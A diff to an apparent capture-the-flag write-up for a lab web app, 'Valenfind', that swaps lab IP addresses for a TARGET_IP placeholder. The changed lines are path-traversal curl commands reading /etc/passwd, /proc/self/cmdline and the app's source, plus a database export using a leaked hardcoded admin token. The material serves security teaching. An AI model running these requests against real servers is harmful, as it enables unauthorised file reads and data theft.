@@ -330,7 +330,7 @@ Before trying to abuse the endpoint, we capture what it returns when used **nor
 
 **Command:** 
 
-	`curl "http://10.48.175.125:5000/api/fetch_layout?layout=theme_modern.html"` or 
+	`curl "http://TARGET_IP:5000/api/fetch_layout?layout=theme_modern.html"` or 
 	`curl "http://10.49.188.115:5000/api/fetch_layout?layout=theme_romance.html"` or 
 	`curl "http://10.49.188.115:5000/api/fetch_layout?layout=theme_classic.html"`
 
@@ -416,7 +416,7 @@ The tool for climbing directories is the sequence **`../`**. Picture the server
 
 The universal proof-of-concept target is **`/etc/passwd`** — a text file present on every Linux system that lists user accounts and is readable by everyone. Retrieving it cleanly demonstrates arbitrary file read without touching anything genuinely sensitive.
 
-**Command:** `curl "http://10.48.175.125:5000/api/fetch_layout?layout=../../../../etc/passwd"`
+**Command:** `curl "http://TARGET_IP:5000/api/fetch_layout?layout=../../../../etc/passwd"`
 
 **Breakdown:**
 
@@ -496,7 +496,7 @@ Reading `/etc/passwd` proves the vulnerability, but the flag won't be there. T
 
 First we must learn **where** the app's files sit on disk. Linux exposes a virtual folder called `/proc` that describes running programs. One special file, `/proc/self/cmdline`, contains the exact command used to launch **the process that is serving our request** — which reveals the script's name and full path.
 
-Command: `curl "http://10.48.175.125:5000/api/fetch_layout?layout=../../../../proc/self/cmdline" --output -`
+Command: `curl "http://TARGET_IP:5000/api/fetch_layout?layout=../../../../proc/self/cmdline" --output -`
 
 Breakdown:
 
@@ -529,7 +529,7 @@ The two null-separated pieces are `/usr/bin/python3` (the Python interpreter) 
 
 With the path known, we point the same path-traversal read at the source file. The source is the map to everything — every route, where data is stored, and any hardcoded secrets.
 
-**Command:** `curl "http://10.48.175.125:5000/api/fetch_layout?layout=../../../../opt/Valenfind/app.py"`
+**Command:** `curl "http://TARGET_IP:5000/api/fetch_layout?layout=../../../../opt/Valenfind/app.py"`
 
 **Result:**
 
@@ -878,7 +878,7 @@ We bypass the blocklist entirely by calling the admin export route and attaching
 
 **Command:**
 
-`curl -H "X-Valentine-Token: CUPID_MASTER_KEY_2024_XOXO" "http://10.48.175.125:5000/api/admin/export_db" --output valenfind_leak.db`
+`curl -H "X-Valentine-Token: CUPID_MASTER_KEY_2024_XOXO" "http://TARGET_IP:5000/api/admin/export_db" --output valenfind_leak.db`
 
 **Breakdown:**
 
